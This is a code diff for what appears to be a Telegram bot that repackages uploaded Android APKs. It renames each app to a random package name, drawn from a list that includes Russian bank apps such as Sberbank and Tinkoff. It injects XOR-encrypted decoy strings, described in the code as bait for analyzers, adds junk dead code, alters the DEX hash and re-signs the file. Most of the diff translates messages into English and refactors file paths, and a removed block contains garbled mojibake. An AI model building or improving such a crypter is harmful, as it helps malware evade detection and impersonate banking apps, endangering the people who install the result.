@@ -7,7 +7,9 @@ import re
 import shutil
 import string
 import subprocess
+import tempfile
 import unicodedata
+from dataclasses import dataclass
 
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.types import FSInputFile
@@ -104,11 +106,7 @@ REQUIRE_SHA256_KEYSTORE = get_env_bool("REQUIRE_SHA256_KEYSTORE", True)
 VERIFY_SIGNED_APK = get_env_bool("VERIFY_SIGNED_APK", True)
 ZIPALIGN_PATH = resolve_command_or_path("ZIPALIGN_PATH", "zipalign")
 JAVA_OPTS = get_env("JAVA_OPTS", "-Xmx256m")
-DOWNLOADS_DIR = os.path.join(BASE_DIR, "downloads")
-TEMP_WORK_DIR = os.path.join(BASE_DIR, "temp_work")
-UNSIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-unsigned.apk")
-ALIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-aligned.apk")
-OUTPUT_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game.apk")
+REQUESTS_DIR = os.path.join(BASE_DIR, "requests")
 PACKAGE_CHOICES = [
     "ru.sberbankmobile",
     "com.idamob.tinkoff.android",
@@ -128,7 +126,7 @@ PACKAGE_CHOICES = [
 ]
 
 FAKE_STRINGS = [
-    # пермишены
+    # permissions
     "android.permission.INTERNET",
     "android.permission.READ_PHONE_STATE",
     "android.permission.ACCESS_FINE_LOCATION",
@@ -141,7 +139,7 @@ FAKE_STRINGS = [
     "com.google.android.gms.analytics.GoogleAnalytics",
     "com.appsflyer.AppsFlyerLib",
     "com.amplitude.api.Amplitude",
-    # системные API
+    # system APIs
     "android.app.NotificationManager",
     "javax.net.ssl.TrustManagerFactory",
     "android.hardware.camera2.CameraManager",
@@ -157,11 +155,11 @@ FAKE_STRINGS = [
     "android.intent.action.VIEW",
     "android.intent.action.BOOT_COMPLETED",
     "android.intent.category.LAUNCHER",
-    # security / сеть
+    # security / network
     "javax.net.ssl.SSLContext",
     "java.security.MessageDigest",
     "java.security.KeyStore",
-    # HTTP заголовки (приманка для анализаторов)
+    # HTTP headers (bait for analyzers)
     "X-Requested-With",
     "Authorization",
 ]
@@ -176,6 +174,36 @@ FAKE_SMALI_PACKAGES = [
 
 dp = Dispatcher()
 
+
+@dataclass(frozen=True)
+class BuildPaths:
+    request_dir: str
+    input_file: str
+    work_dir: str
+    unsigned_apk_path: str
+    aligned_apk_path: str
+    output_apk_path: str
+
+
+def create_build_paths(input_name):
+    safe_name = os.path.basename(input_name) or "input.apk"
+    os.makedirs(REQUESTS_DIR, exist_ok=True)
+
+    request_dir = tempfile.mkdtemp(prefix="request-", dir=REQUESTS_DIR)
+    downloads_dir = os.path.join(request_dir, "downloads")
+    artifacts_dir = os.path.join(request_dir, "artifacts")
+
+    os.makedirs(downloads_dir, exist_ok=True)
+    os.makedirs(artifacts_dir, exist_ok=True)
+
+    return BuildPaths(
+        request_dir=request_dir,
+        input_file=os.path.join(downloads_dir, safe_name),
+        work_dir=os.path.join(request_dir, "temp_work"),
+        unsigned_apk_path=os.path.join(artifacts_dir, "rebuilt_game-unsigned.apk"),
+        aligned_apk_path=os.path.join(artifacts_dir, "rebuilt_game-aligned.apk"),
+        output_apk_path=os.path.join(artifacts_dir, "rebuilt_game.apk"),
+    )
 
 class StageError(Exception):
     def __init__(self, stage, details=""):
@@ -235,6 +263,18 @@ def run_command(command, stage, *, env=None):
             text=True,
             env=env,
         )
+    except FileNotFoundError as exc:
+        executable = ""
+        if isinstance(command, (list, tuple)) and command:
+            executable = str(command[0])
+        elif isinstance(command, str):
+            executable = command.strip().split()[0]
+        else:
+            executable = str(command)
+
+        tool_name = os.path.basename(executable) or executable
+        details = f"Required command '{tool_name}' was not found. Check that it is installed and available in PATH."
+        raise StageError(stage, details) from exc
     except subprocess.CalledProcessError as exc:
         details = combine_process_output(exc.stdout, exc.stderr)
         raise StageError(stage, normalize_cli_output(details)) from exc
@@ -254,7 +294,7 @@ def describe_secret_issues(env_name, value):
     issues = []
 
     if value != value.strip():
-        issues.append(f"{env_name} содержит пробел в начале или в конце.")
+        issues.append(f"{env_name} contains leading or trailing whitespace.")
 
     invisible_codes = []
     for char in value:
@@ -267,32 +307,32 @@ def describe_secret_issues(env_name, value):
 
     if invisible_codes:
         unique_codes = ", ".join(sorted(set(invisible_codes)))
-        issues.append(f"{env_name} содержит невидимые символы ({unique_codes}).")
+        issues.append(f"{env_name} contains invisible characters ({unique_codes}).")
 
     return issues
 
 
 def build_keystore_troubleshooting(*, include_key_password=True):
     hints = [
-        "Предупреждение про JKS и PKCS12 само по себе не является ошибкой: JKS старый, но рабочий формат.",
-        f"Проверьте, что используется именно этот keystore: '{KS_PATH}'.",
+        "A JKS or PKCS12 warning by itself is not a failure: JKS is old, but still supported.",
+        f"Make sure the expected keystore is being used: '{KS_PATH}'.",
     ]
 
     if KS_TYPE:
-        hints.append(f"Для подписи используется тип хранилища KS_TYPE={KS_TYPE}.")
+        hints.append(f"Signing is configured to use keystore type KS_TYPE={KS_TYPE}.")
     else:
-        hints.append("Если это JKS-файл на Linux/новом Java, задайте KS_TYPE=JKS.")
+        hints.append("If this is a JKS file on Linux or a newer Java runtime, try setting KS_TYPE=JKS.")
 
     if KS_PASS_ENCODING:
-        hints.append(f"Для подписи используется кодировка пароля KS_PASS_ENCODING={KS_PASS_ENCODING}.")
+        hints.append(f"Signing is configured to use password encoding KS_PASS_ENCODING={KS_PASS_ENCODING}.")
     elif any(ord(char) > 127 for char in f"{KS_PASS}{KS_KEY_PASS}"):
-        hints.append("Если пароль содержит не-ASCII символы, попробуйте задать KS_PASS_ENCODING=utf-8.")
+        hints.append("If the password contains non-ASCII characters, try setting KS_PASS_ENCODING=utf-8.")
 
     hints.extend(describe_secret_issues("KS_PASS", KS_PASS))
 
     if include_key_password:
         hints.append(
-            "Если keytool принимает KS_PASS, а подпись все равно падает, проверьте отдельный пароль ключа KS_KEY_PASS."
+            "If keytool accepts KS_PASS but signing still fails, verify whether the key itself uses a separate password in KS_KEY_PASS."
         )
         hints.extend(describe_secret_issues("KS_KEY_PASS", KS_KEY_PASS))
 
@@ -302,7 +342,7 @@ def build_keystore_troubleshooting(*, include_key_password=True):
 def format_keystore_error(summary, *, details="", include_key_password=True):
     parts = [summary, "", build_keystore_troubleshooting(include_key_password=include_key_password)]
     if details:
-        parts.extend(["", f"Детали утилиты: {details}"])
+        parts.extend(["", f"Tool output: {details}"])
     return "\n".join(parts)
 
 
@@ -386,7 +426,7 @@ def validate_keystore():
         if "password was incorrect" in message or "keystore was tampered with" in message:
             raise KeystoreConfigError(
                 format_keystore_error(
-                    "Не удалось открыть keystore через keytool.",
+                    "keytool could not open the keystore.",
                     details=exc.details,
                     include_key_password=False,
                 )
@@ -394,55 +434,54 @@ def validate_keystore():
         if "alias <" in message and "does not exist" in message:
             raise KeystoreConfigError(
                 format_keystore_error(
-                    f"В keystore '{KS_PATH}' не найден alias '{KS_ALIAS}'.",
+                    f"Alias '{KS_ALIAS}' was not found in keystore '{KS_PATH}'.",
                     details=exc.details,
                     include_key_password=False,
                 )
             ) from exc
         raise KeystoreConfigError(
-            format_keystore_error("Не удалось проверить keystore.", details=exc.details)
+            format_keystore_error("Keystore validation failed.", details=exc.details)
         ) from exc
-
 
     if REQUIRE_SHA256_KEYSTORE:
         details = combine_process_output(result.stdout, result.stderr).replace(" ", "").lower()
         if "signaturealgorithmname:sha256" not in details:
             raise KeystoreConfigError(
-                "Сертификат keystore должен использовать SHA-256. Пересоздайте его командой "
-                "'keytool -genkey -sigalg SHA256withRSA ...' или отключите "
+                "The keystore certificate must use SHA-256. Regenerate it with "
+                "'keytool -genkey -sigalg SHA256withRSA ...' or disable "
                 "REQUIRE_SHA256_KEYSTORE."
             )
 
 
 def xor_encrypt_bytes(text, key_bytes):
-    """XOR-шифрование UTF-8 строки многобайтовым ключом (rolling XOR)."""
+    """XOR-encrypt a UTF-8 string with a multi-byte rolling key."""
     data = text.encode("utf-8")
     return [b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)]
 
 
 def _smali_array_data(byte_list):
-    """Форматирует список байт для .array-data 1 в smali."""
+    """Format bytes for a `.array-data 1` smali block."""
     return "\n        ".join(f"0x{b:02x}" for b in byte_list)
 
 
 def generate_encrypted_smali(class_name, decrypt_entries, key_bytes, smali_package):
     """
-    Генерирует smali-класс с XOR-зашифрованными строками.
+    Generate a smali class with XOR-encrypted string payloads.
 
-    decrypt_entries : list[(method_name, fake_string)] — по одному методу на строку
-    key_bytes       : list[int] — многобайтовый rolling XOR-ключ
-    smali_package   : str — e.g. 'com/security/guard'
+    decrypt_entries : list[(method_name, fake_string)] - one method per fake string
+    key_bytes       : list[int] - rolling XOR key bytes
+    smali_package   : str - e.g. 'com/security/guard'
     """
     class_ref = f"L{smali_package}/{class_name};"
     key_len = len(key_bytes)
 
-    # Предвычисляем зашифрованные данные
+    # Precompute encrypted payloads.
     enc_data = [
         (method_name, xor_encrypt_bytes(fake_string, key_bytes))
         for method_name, fake_string in decrypt_entries
     ]
 
-    # --- поля ---
+    # --- fields ---
     field_lines = [".field private static final KEY:[B"]
     for idx in range(len(enc_data)):
         field_lines.append(f".field private static final ENCRYPTED_{idx}:[B")
@@ -481,7 +520,7 @@ def generate_encrypted_smali(class_name, decrypt_entries, key_bytes, smali_packa
         ]
     clinit.append(".end method")
 
-    # --- методы-дешифраторы (rolling XOR по KEY) ---
+    # --- decryptors (rolling XOR via KEY) ---
     decrypt_blocks = []
     for idx, (method_name, _) in enumerate(enc_data):
         m = [
@@ -509,7 +548,7 @@ def generate_encrypted_smali(class_name, decrypt_entries, key_bytes, smali_packa
         ]
         decrypt_blocks.append("\n".join(m))
 
-    # --- мусорный метод (dead code, никогда не вызывается) ---
+    # --- junk method (dead code, never called) ---
     junk_name = generate_random_string(6)
     r1 = random.randint(2, 15)
     r2 = random.randint(16, 127)
@@ -552,7 +591,7 @@ def generate_encrypted_smali(class_name, decrypt_entries, key_bytes, smali_packa
 
 
 def inject_security_measures(work_dir):
-    print("🔒 Применение защиты кода...")
+    print("Applying code hardening...")
 
     manifest = os.path.join(work_dir, "AndroidManifest.xml")
     if os.path.exists(manifest):
@@ -588,38 +627,38 @@ def inject_security_measures(work_dir):
             file.write(smali_content)
 
 
-def sign_apk(unsigned_apk, output_apk, *, env=None):
-    remove_file_if_exists(ALIGNED_APK_PATH)
+def sign_apk(unsigned_apk, aligned_apk, output_apk, *, env=None):
+    remove_file_if_exists(aligned_apk)
     remove_file_if_exists(output_apk)
 
     run_command(
-        [ZIPALIGN_PATH, "-f", "-p", "4", unsigned_apk, ALIGNED_APK_PATH],
+        [ZIPALIGN_PATH, "-f", "-p", "4", unsigned_apk, aligned_apk],
         "zipalign",
         env=env,
     )
 
     try:
-        run_command(build_apksigner_command(ALIGNED_APK_PATH, output_apk), "sign", env=env)
+        run_command(build_apksigner_command(aligned_apk, output_apk), "sign", env=env)
     except StageError as exc:
         message = exc.details.lower()
         if "keystore was tampered with" in message or "password was incorrect" in message:
             raise KeystoreConfigError(
                 format_keystore_error(
-                    "Подписывающая утилита не смогла открыть keystore.",
+                    "The signing tool could not open the keystore.",
                     details=exc.details,
                 )
             ) from exc
         if "does not exist" in message and "alias" in message:
             raise KeystoreConfigError(
                 format_keystore_error(
-                    f"В keystore '{KS_PATH}' не найден alias '{KS_ALIAS}'.",
+                    f"Alias '{KS_ALIAS}' was not found in keystore '{KS_PATH}'.",
                     details=exc.details,
                 )
             ) from exc
         if "cannot recover key" in message or "failed to obtain key" in message:
             raise KeystoreConfigError(
                 format_keystore_error(
-                    "Keystore открылся, но пароль ключа внутри него не подошел. Проверьте KS_KEY_PASS.",
+                    "The keystore opened, but the key password was rejected. Check KS_KEY_PASS.",
                     details=exc.details,
                 )
             ) from exc
@@ -629,19 +668,19 @@ def sign_apk(unsigned_apk, output_apk, *, env=None):
         run_command(build_apksigner_verify_command(output_apk), "verify", env=env)
 
 
-def patch_apk(input_path, new_package):
-    work_dir = TEMP_WORK_DIR
+def patch_apk(paths, new_package):
+    work_dir = paths.work_dir
     java_env = {**os.environ, "JAVA_OPTS": JAVA_OPTS}
 
     if os.path.exists(work_dir):
         shutil.rmtree(work_dir)
 
-    for artifact in (UNSIGNED_APK_PATH, ALIGNED_APK_PATH, OUTPUT_APK_PATH):
+    for artifact in (paths.unsigned_apk_path, paths.aligned_apk_path, paths.output_apk_path):
         remove_file_if_exists(artifact)
 
-    print("📦 Распаковка (может занять несколько минут для больших APK)...")
+    print("Unpacking APK (large files may take a while)...")
     run_command(
-        ["apktool", "d", input_path, "-o", work_dir, "-f"],
+        ["apktool", "d", paths.input_file, "-o", work_dir, "-f"],
         "decode",
         env=java_env,
     )
@@ -657,49 +696,18 @@ def patch_apk(input_path, new_package):
 
     inject_security_measures(work_dir)
 
-    print("🔨 Сборка...")
+    print("Rebuilding APK...")
     run_command(
-        ["apktool", "b", work_dir, "-o", UNSIGNED_APK_PATH],
+        ["apktool", "b", work_dir, "-o", paths.unsigned_apk_path],
         "build",
         env=java_env,
     )
 
-    print("📏 Zipalign...")
-    print("✍️ Подпись (V2/V3)...")
-    sign_apk(UNSIGNED_APK_PATH, OUTPUT_APK_PATH, env=java_env)
+    print("Running zipalign...")
+    print("Signing APK (V2/V3)...")
+    sign_apk(paths.unsigned_apk_path, paths.aligned_apk_path, paths.output_apk_path, env=java_env)
 
-    return OUTPUT_APK_PATH
-
-
-def _legacy_build_stage_message(error):
-    if error.stage == "decode":
-        return (
-            "❌ Не удалось распаковать APK через apktool.\n\n"
-            f"{error.details or 'Проверьте, что файл не поврежден и не защищен от разборки.'}"
-        )
-    if error.stage == "build":
-        return (
-            "❌ Не удалось собрать APK после изменений.\n\n"
-            f"{error.details or 'Проверьте smali/manifest после модификации.'}"
-        )
-    if error.stage == "zipalign":
-        return (
-            "❌ Не удалось выровнять APK через zipalign.\n\n"
-            f"{error.details or 'Проверьте, что zipalign установлен и доступен в PATH.'}"
-        )
-    if error.stage == "sign":
-        return (
-            "❌ Не удалось подписать APK.\n\n"
-            f"{error.details or 'Проверьте keystore и параметры подписи.'}"
-        )
-    return f"❌ Ошибка на этапе '{error.stage}'.\n\n{error.details or 'Без деталей.'}"
-
-
-    if error.stage == "verify":
-        return (
-            "вќЊ РџРѕРґРїРёСЃР°РЅРЅС‹Р№ APK РЅРµ РїСЂРѕС€РµР» РїСЂРѕРІРµСЂРєСѓ apksigner.\n\n"
-            f"{error.details or 'РџСЂРѕРІРµСЂСЊС‚Рµ SIGN_V1_ENABLED, SIGN_V2_ENABLED, SIGN_V3_ENABLED Рё SIGN_MIN_SDK_VERSION.'}"
-        )
+    return paths.output_apk_path
 
 
 def build_stage_message(error):
@@ -733,48 +741,43 @@ def build_stage_message(error):
 
 @dp.message(F.document)
 async def handle_apk(message: types.Message):
-    if not message.document.file_name.endswith(".apk"):
-        return await message.answer("⚠️ Пришли файл формата .apk")
+    file_name = message.document.file_name or ""
+    if not file_name.lower().endswith(".apk"):
+        return await message.answer("Send an .apk file.")
 
     await message.answer(
-        "🚀 Начинаю реверс, инъекцию защиты и пересборку. Ожидайте..."
+        "Starting reverse, hardening injection and rebuild. Please wait..."
     )
 
     file_id = message.document.file_id
-    input_name = os.path.basename(message.document.file_name)
-    input_file = os.path.join(DOWNLOADS_DIR, input_name)
-    os.makedirs(DOWNLOADS_DIR, exist_ok=True)
-
-    file = await message.bot.get_file(file_id)
-    await message.bot.download_file(file.file_path, input_file)
+    input_name = os.path.basename(file_name) or "input.apk"
+    paths = create_build_paths(input_name)
 
     try:
+        file = await message.bot.get_file(file_id)
+        await message.bot.download_file(file.file_path, paths.input_file)
+
         new_pkg = choose_random_package()
-        result_path = await asyncio.to_thread(patch_apk, input_file, new_pkg)
+        result_path = await asyncio.to_thread(patch_apk, paths, new_pkg)
         result_sha256 = await asyncio.to_thread(calculate_sha256, result_path)
         await message.answer_document(
             FSInputFile(result_path, filename=input_name),
             caption=(
                 f"SHA-256: {result_sha256}\n"
-                "✅ Готово!\n\n"
-                "🛡 Внедрен анти-дебаг\n"
-                "🧬 Код мутирован (изменен DEX хеш)\n"
-                f"📦 Новый пакет: {new_pkg}"
+                "Done.\n\n"
+                "Injected anti-debug hardening\n"
+                "Mutated code paths (DEX hash changed)\n"
+                f"New package name: {new_pkg}"
             ),
         )
     except KeystoreConfigError as exc:
-        await message.answer(f"❌ Ошибка keystore:\n\n{exc}")
+        await message.answer(f"Keystore error:\n\n{exc}")
     except StageError as exc:
         await message.answer(build_stage_message(exc))
     except Exception as exc:
-        await message.answer(f"❌ Системная ошибка: {exc}")
+        await message.answer(f"Unexpected error: {exc}")
     finally:
-        if os.path.exists(TEMP_WORK_DIR):
-            shutil.rmtree(TEMP_WORK_DIR)
-        if os.path.exists(input_file):
-            os.remove(input_file)
-        remove_file_if_exists(UNSIGNED_APK_PATH)
-        remove_file_if_exists(ALIGNED_APK_PATH)
+        shutil.rmtree(paths.request_dir, ignore_errors=True)
 
 
 async def main():
@@ -782,21 +785,21 @@ async def main():
 
     if not API_TOKEN:
         errors.append(
-            "[ТОКЕН]   Переменная BOT_TOKEN не задана.\n"
-            "          -> Windows:   set BOT_TOKEN=ваш_токен\n"
-            "          -> Linux/Mac: export BOT_TOKEN=ваш_токен"
+            "[TOKEN]   BOT_TOKEN is not set.\n"
+            "          -> Windows:   set BOT_TOKEN=your_token\n"
+            "          -> Linux/Mac: export BOT_TOKEN=your_token"
         )
 
     checks = [
         (
             SIGNER_PATH,
-            "Скачайте uber-apk-signer:\n"
+            "Download uber-apk-signer:\n"
             "          -> https://github.com/patrickfav/uber-apk-signer/releases\n"
-            "          -> Положите .jar рядом с main.py или задайте SIGNER_PATH",
+            "          -> Put the .jar next to main.py or set SIGNER_PATH",
         ),
         (
             KS_PATH,
-            "Создайте keystore или укажите путь через KS_PATH:\n"
+            "Create a keystore or point KS_PATH to an existing one:\n"
             "          -> keytool -genkey -v -keystore my-release-key.jks "
             "-alias my-alias -keyalg RSA -sigalg SHA256withRSA -keysize 2048 -validity 10000 "
             "-storepass 12345678 -keypass 12345678",
@@ -804,48 +807,48 @@ async def main():
     ]
     for fpath, hint in checks:
         if not os.path.exists(fpath):
-            errors.append(f"[ФАЙЛ]    '{fpath}' не найден.\n          {hint}")
+            errors.append(f"[FILE]    '{fpath}' was not found.\n          {hint}")
 
     tools = [
-        ("java", "Установите JDK/JRE и добавьте в PATH."),
+        ("java", "Install JDK/JRE and add it to PATH."),
         (
             "apktool",
-            "Установите apktool:\n"
+            "Install apktool:\n"
             "          -> https://apktool.org/docs/install\n"
-            "          -> Убедитесь, что 'apktool' доступен из командной строки.",
+            "          -> Make sure 'apktool' is available from the command line.",
         ),
         (
             ZIPALIGN_PATH,
-            "Установите zipalign и добавьте его в PATH либо задайте ZIPALIGN_PATH.",
+            "Install zipalign and add it to PATH, or set ZIPALIGN_PATH.",
         ),
     ]
     for tool, hint in tools:
         if not shutil.which(tool) and not os.path.exists(tool):
-            errors.append(f"[PATH]    '{tool}' не найден.\n          {hint}")
+            errors.append(f"[PATH]    '{tool}' was not found.\n          {hint}")
 
     if not errors:
         try:
             validate_keystore()
         except KeystoreConfigError as exc:
             errors.append(
-                "[KEYSTORE] Неверная конфигурация подписи.\n"
+                "[KEYSTORE] Invalid signing configuration.\n"
                 f"          {exc}\n"
-                "          -> Проверьте KS_PATH, KS_ALIAS, KS_PASS, KS_KEY_PASS, KS_TYPE и KS_PASS_ENCODING."
+                "          -> Check KS_PATH, KS_ALIAS, KS_PASS, KS_KEY_PASS, KS_TYPE and KS_PASS_ENCODING."
             )
 
     if errors:
         print("=" * 60)
-        print("  ПРЕДСТАРТОВАЯ ПРОВЕРКА: обнаружены проблемы")
+        print("  Startup check: problems detected")
         print("=" * 60)
         for index, err in enumerate(errors, 1):
             print(f"\n  {index}. {err}")
         print("\n" + "=" * 60)
-        print("  Устраните проблемы выше и перезапустите скрипт.")
+        print("  Fix the issues above and restart the script.")
         print("=" * 60)
         return
 
     bot = Bot(token=API_TOKEN)
-    print("Бот-Аналитик запущен!")
+    print("Bot is running!")
     await dp.start_polling(bot)
 
 
